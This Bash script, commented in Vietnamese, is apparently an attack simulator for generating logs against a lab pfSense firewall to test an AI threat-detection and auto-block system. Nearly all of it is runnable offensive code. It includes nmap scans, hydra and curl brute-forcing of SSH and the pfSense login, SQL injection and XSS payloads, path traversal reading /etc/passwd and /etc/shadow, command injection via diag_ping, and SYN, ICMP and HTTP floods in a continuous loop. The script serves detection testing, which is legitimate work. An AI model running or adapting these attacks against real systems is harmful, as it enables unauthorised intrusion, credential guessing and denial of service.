#!/bin/bash
#
# KỊCH BẢN TẤN CÔNG - pfSense Honeypot Testing
# Tấn công thực tế vào pfSense để tạo logs
#

TARGET="192.168.81.131"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${RED}╔═══════════════════════════════════════╗${NC}"
echo -e "${RED}║   ATTACK SIMULATION - AI TESTING     ║${NC}"
echo -e "${RED}╔═══════════════════════════════════════╗${NC}\n"

# ============================================
# 1. PORT SCANNING - Score: 20-30
# ============================================
attack_portscan() {
    echo -e "${YELLOW}[ATTACK 1] Port Scanning${NC}"
    echo "[*] Scanning common ports..."
    
    # Quick scan để tạo nhiều connection logs
    nmap -sS --top-ports 100 -T5 $TARGET
    
    echo "[*] Scanning specific services..."
    nmap -p 22,80,443,3389,3306,5432,8080,8443 $TARGET
    
    echo -e "${GREEN}✓ Port scan completed${NC}"
    echo -e "${BLUE}Expected: AI should detect multiple port access${NC}\n"
    sleep 2
}

# ============================================
# 2. BRUTE FORCE - Score: 40-50
# ============================================
attack_bruteforce() {
    echo -e "${YELLOW}[ATTACK 2] Brute Force${NC}"
    
    # Tạo password list ngắn
    cat > /tmp/pass.txt << EOF
admin
pfsense
password
123456
root
EOF
    
    echo "[*] SSH brute force (nếu SSH mở)..."
    timeout 30 hydra -l admin -P /tmp/pass.txt ssh://$TARGET -t 2 -V 2>/dev/null || echo "SSH not available or timeout"
    
    echo "[*] HTTP login brute force..."
    # Tấn công vào pfSense login page
    for pass in admin pfsense password 123456 root; do
        curl -s -X POST "https://$TARGET/index.php" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "login=Login&usernamefld=admin&passwordfld=$pass" \
            --insecure > /dev/null
        echo "  [*] Tried password: $pass"
        sleep 0.5
    done
    
    rm -f /tmp/pass.txt
    
    echo -e "${GREEN}✓ Brute force completed${NC}"
    echo -e "${BLUE}Expected: Multiple failed login attempts detected${NC}\n"
    sleep 2
}

# ============================================
# 3. WEB ATTACKS - Tấn công vào pfSense WebGUI
# ============================================
attack_web_pfsense() {
    echo -e "${YELLOW}[ATTACK 3] Web Attacks on pfSense${NC}"
    
    echo "[*] Attacking pfSense login page with SQLi payloads..."
    
    # SQL Injection vào login form
    curl -s -X POST "https://$TARGET/index.php" \
        -d "usernamefld=admin'OR'1'='1&passwordfld=admin&login=Login" \
        --insecure > /dev/null
    echo "  [*] SQLi attempt 1"
    
    curl -s -X POST "https://$TARGET/index.php" \
        -d "usernamefld=admin'--&passwordfld=&login=Login" \
        --insecure > /dev/null
    echo "  [*] SQLi attempt 2"
    
    curl -s -X POST "https://$TARGET/index.php" \
        -d "usernamefld=admin' UNION SELECT * FROM users--&passwordfld=&login=Login" \
        --insecure > /dev/null
    echo "  [*] SQLi attempt 3"
    
    echo "[*] XSS attempts on pfSense..."
    
    # XSS vào các parameters
    curl -s "https://$TARGET/index.php?username=<script>alert(1)</script>" --insecure > /dev/null
    echo "  [*] XSS attempt 1"
    
    curl -s "https://$TARGET/status.php?query=<img src=x onerror=alert(1)>" --insecure > /dev/null
    echo "  [*] XSS attempt 2"
    
    echo "[*] Directory traversal attempts..."
    
    curl -s "https://$TARGET/index.php?file=../../../../etc/passwd" --insecure > /dev/null
    echo "  [*] Path traversal 1"
    
    curl -s "https://$TARGET/diag_command.php?file=../../../../../../etc/shadow" --insecure > /dev/null
    echo "  [*] Path traversal 2"
    
    echo "[*] Command injection attempts..."
    
    curl -s "https://$TARGET/diag_ping.php?host=127.0.0.1;cat+/etc/passwd" --insecure > /dev/null
    echo "  [*] Command injection 1"
    
    curl -s "https://$TARGET/exec.php?cmd=whoami" --insecure > /dev/null
    echo "  [*] Command injection 2"
    
    echo -e "${GREEN}✓ Web attacks completed${NC}"
    echo -e "${RED}Expected: High threat score → AUTO-BLOCK${NC}\n"
    sleep 2
}

# ============================================
# 4. SUSPICIOUS USER AGENTS
# ============================================
attack_useragent() {
    echo -e "${YELLOW}[ATTACK 4] Suspicious User Agents${NC}"
    
    echo "[*] Accessing with known attack tool user agents..."
    
    curl -A "sqlmap/1.5" "https://$TARGET/" --insecure -s > /dev/null
    echo "  [*] sqlmap user agent"
    
    curl -A "Nikto/2.1.6" "https://$TARGET/" --insecure -s > /dev/null
    echo "  [*] Nikto user agent"
    
    curl -A "Nmap Scripting Engine" "https://$TARGET/" --insecure -s > /dev/null
    echo "  [*] Nmap NSE user agent"
    
    curl -A "Acunetix" "https://$TARGET/" --insecure -s > /dev/null
    echo "  [*] Acunetix user agent"
    
    curl -A "masscan/1.0" "https://$TARGET/" --insecure -s > /dev/null
    echo "  [*] masscan user agent"
    
    echo -e "${GREEN}✓ User agent attacks completed${NC}"
    echo -e "${BLUE}Expected: Suspicious tool detection${NC}\n"
    sleep 2
}

# ============================================
# 5. DDoS SIMULATION
# ============================================
attack_ddos() {
    echo -e "${YELLOW}[ATTACK 5] DDoS Simulation${NC}"
    
    # Kiểm tra hping3
    if ! command -v hping3 &> /dev/null; then
        echo -e "${RED}hping3 not installed. Using curl flood instead...${NC}"
        echo "[*] HTTP flood (100 rapid requests)..."
        for i in {1..100}; do
            curl -s "https://$TARGET/" --insecure > /dev/null &
        done
        wait
    else
        echo "[*] SYN flood (10 seconds)..."
        timeout 10 sudo hping3 -S -p 443 --flood $TARGET > /dev/null 2>&1 &
        sleep 11
        
        echo "[*] ICMP flood (10 seconds)..."
        timeout 10 sudo hping3 --icmp --flood $TARGET > /dev/null 2>&1 &
        sleep 11
    fi
    
    # HTTP flood (luôn hoạt động)
    echo "[*] HTTP flood (150 concurrent requests)..."
    for i in {1..150}; do
        curl -s "https://$TARGET/index.php" --insecure > /dev/null 2>&1 &
    done
    wait
    
    echo -e "${GREEN}✓ DDoS simulation completed${NC}"
    echo -e "${RED}Expected: Very high RPS → IMMEDIATE BLOCK${NC}\n"
    sleep 2
}

# ============================================
# 6. COMBINED ATTACK
# ============================================
attack_combined() {
    echo -e "${RED}[ATTACK 6] COMBINED ATTACK${NC}"
    echo -e "${RED}Multiple attack vectors simultaneously!${NC}\n"
    
    read -p "Execute combined attack? (yes/no): " confirm
    if [ "$confirm" != "yes" ]; then
        return
    fi
    
    echo "[*] Launching multi-vector attack..."
    
    # Port scan in background
    nmap -sS --top-ports 50 -T5 $TARGET > /dev/null 2>&1 &
    
    # Web attacks
    for i in {1..10}; do
        curl -s "https://$TARGET/index.php?user=admin'OR'1'='1" --insecure > /dev/null &
        curl -s "https://$TARGET/index.php?q=<script>alert(1)</script>" --insecure > /dev/null &
        curl -A "sqlmap/1.5" "https://$TARGET/" --insecure > /dev/null &
    done
    
    # Brute force
    for pass in admin pfsense password; do
        curl -s -X POST "https://$TARGET/index.php" \
            -d "usernamefld=admin&passwordfld=$pass&login=Login" \
            --insecure > /dev/null &
    done
    
    # HTTP flood
    for i in {1..50}; do
        curl -s "https://$TARGET/" --insecure > /dev/null &
    done
    
    wait
    
    echo -e "${RED}✓ COMBINED ATTACK COMPLETED${NC}"
    echo -e "${RED}Expected: Score = 100 → IMMEDIATE BLOCK${NC}\n"
}

# ============================================
# QUICK TEST - Simplified
# ============================================
quick_test() {
    echo -e "${BLUE}[QUICK TEST] Running essential attacks...${NC}\n"
    
    echo "1. Port scan (20 ports)..."
    nmap -sS --top-ports 20 -T5 $TARGET > /dev/null 2>&1
    echo "   ✓ Port scan completed"
    sleep 3
    
    echo "2. Failed login attempts..."
    for i in {1..5}; do
        curl -s -X POST "https://$TARGET/index.php" \
            -d "usernamefld=admin&passwordfld=wrong$i&login=Login" \
            --insecure > /dev/null
    done
    echo "   ✓ Brute force completed"
    sleep 3
    
    echo "3. SQL injection attempts..."
    curl -s "https://$TARGET/index.php?user=admin'OR'1'='1" --insecure > /dev/null
    curl -s "https://$TARGET/index.php?id=1'--" --insecure > /dev/null
    curl -s "https://$TARGET/index.php?id=1' UNION SELECT * FROM users--" --insecure > /dev/null
    echo "   ✓ SQLi completed"
    sleep 3
    
    echo "4. XSS attempts..."
    curl -s "https://$TARGET/index.php?q=<script>alert(1)</script>" --insecure > /dev/null
    curl -s "https://$TARGET/status.php?msg=<img src=x onerror=alert(1)>" --insecure > /dev/null
    echo "   ✓ XSS completed"
    sleep 3
    
    echo "5. HTTP flood..."
    for i in {1..50}; do
        curl -s "https://$TARGET/" --insecure > /dev/null &
    done
    wait
    echo "   ✓ Flood completed"
    
    echo ""
    echo -e "${GREEN}✓ Quick test completed${NC}"
    echo -e "${BLUE}Check pfSense logs and AI detection console${NC}\n"
}

# ============================================
# CONTINUOUS ATTACK - For testing detection
# ============================================
continuous_attack() {
    echo -e "${RED}[CONTINUOUS ATTACK] Running attacks in loop${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop${NC}\n"
    
    counter=1
    while true; do
        echo -e "${BLUE}[Cycle $counter]${NC}"
        
        # Random attacks
        attack_type=$((RANDOM % 5 + 1))
        
        case $attack_type in
            1)
                echo "  → Port scan"
                nmap -sS --top-ports 10 -T5 $TARGET > /dev/null 2>&1
                ;;
            2)
                echo "  → SQLi attempt"
                curl -s "https://$TARGET/index.php?id=$RANDOM' OR '1'='1" --insecure > /dev/null
                ;;
            3)
                echo "  → XSS attempt"
                curl -s "https://$TARGET/?q=<script>alert($RANDOM)</script>" --insecure > /dev/null
                ;;
            4)
                echo "  → Failed login"
                curl -s -X POST "https://$TARGET/index.php" \
                    -d "usernamefld=admin&passwordfld=wrong$RANDOM&login=Login" \
                    --insecure > /dev/null
                ;;
            5)
                echo "  → Suspicious UA"
                curl -A "sqlmap/1.$RANDOM" "https://$TARGET/" --insecure > /dev/null
                ;;
        esac
        
        counter=$((counter + 1))
        sleep 2
    done
}

# ============================================
# MENU
# ============================================
show_menu() {
    echo -e "${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║      SELECT ATTACK SCENARIO            ║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    echo -e "${GREEN}1)${NC}  Port Scanning          (Score: ~20-30)"
    echo -e "${GREEN}2)${NC}  Brute Force            (Score: ~40-50)"
    echo -e "${GREEN}3)${NC}  Web Attacks (SQLi/XSS) (Score: ~70-90) ${RED}[BLOCK]${NC}"
    echo -e "${GREEN}4)${NC}  Suspicious User Agents (Score: ~30-40)"
    echo -e "${GREEN}5)${NC}  DDoS Simulation        (Score: ~90-100) ${RED}[BLOCK]${NC}"
    echo -e "${RED}6)${NC}  Combined Attack        (Score: 100) ${RED}[IMMEDIATE BLOCK]${NC}"
    echo ""
    echo -e "${YELLOW}Q)${NC}  Quick Test (Recommended)"
    echo -e "${YELLOW}C)${NC}  Continuous Attack (Testing mode)"
    echo -e "${YELLOW}A)${NC}  Run All Attacks Sequentially"
    echo -e "${RED}0)${NC}  Exit"
    echo ""
}

# ============================================
# MAIN
# ============================================
clear
echo "Target: $TARGET"
echo "Attacking pfSense WebGUI and services"
echo ""

# Kiểm tra target có response không
echo -n "Testing connection to $TARGET... "
if curl -s -o /dev/null -w "%{http_code}" "https://$TARGET/" --insecure --connect-timeout 5 | grep -q "^[0-9]"; then
    echo -e "${GREEN}OK${NC}"
else
    echo -e "${RED}FAILED${NC}"
    echo "Warning: Target may not be reachable"
fi
echo ""

while true; do
    show_menu
    read -p "Select option: " choice
    
    case $choice in
        1) attack_portscan ;;
        2) attack_bruteforce ;;
        3) attack_web_pfsense ;;
        4) attack_useragent ;;
        5) attack_ddos ;;
        6) attack_combined ;;
        Q|q) quick_test ;;
        C|c) continuous_attack ;;
        A|a)
            attack_portscan
            attack_bruteforce
            attack_web_pfsense
            attack_useragent
            attack_ddos
            ;;
        0) echo -e "${GREEN}Exiting...${NC}"; exit 0 ;;
        *) echo -e "${RED}Invalid option${NC}" ;;
    esac
    
    read -p "Press ENTER to continue..."
    clear
    echo -e "${RED}╔═══════════════════════════════════════╗${NC}"
    echo -e "${RED}║   ATTACK SIMULATION - AI TESTING     ║${NC}"
    echo -e "${RED}╔═══════════════════════════════════════╗${NC}\n"
    echo "Target: $TARGET"
    echo ""
done
